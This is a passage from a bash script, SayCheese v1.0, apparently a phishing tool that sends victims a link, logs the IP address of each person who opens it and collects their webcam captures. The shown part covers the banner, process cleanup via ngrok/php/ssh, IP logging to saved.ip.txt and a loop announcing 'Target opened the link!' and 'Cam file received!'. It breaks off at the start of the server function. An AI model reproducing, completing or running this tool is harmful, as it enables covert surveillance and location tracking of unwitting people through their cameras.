#!/bin/bash
# SayCheese v1.0
# coded by: github.com/thelinuxchoice/saycheese
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {


printf "\e[0;36m  ____              \e[0m\e[0;36m ____ _                          \e[0m\n"
printf "\e[0;36m / ___|  __ _ _   _ \e[0m\e[0;36m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "\e[0;36m \___ \ / _\` | | | \e[0m\e[0;36m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "\e[0;36m  ___) | (_| | |_| |\e[0m\e[0;36m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "\e[0;36m |____/ \__,_|\__, |\e[0m\e[0;36m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "\e[0;36m              |___/ \e[0m                                 \n"

printf " \e[37m v1.0 coded by https://github.com/cyb3rt3ch/saycheese\e[0m \n"

printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

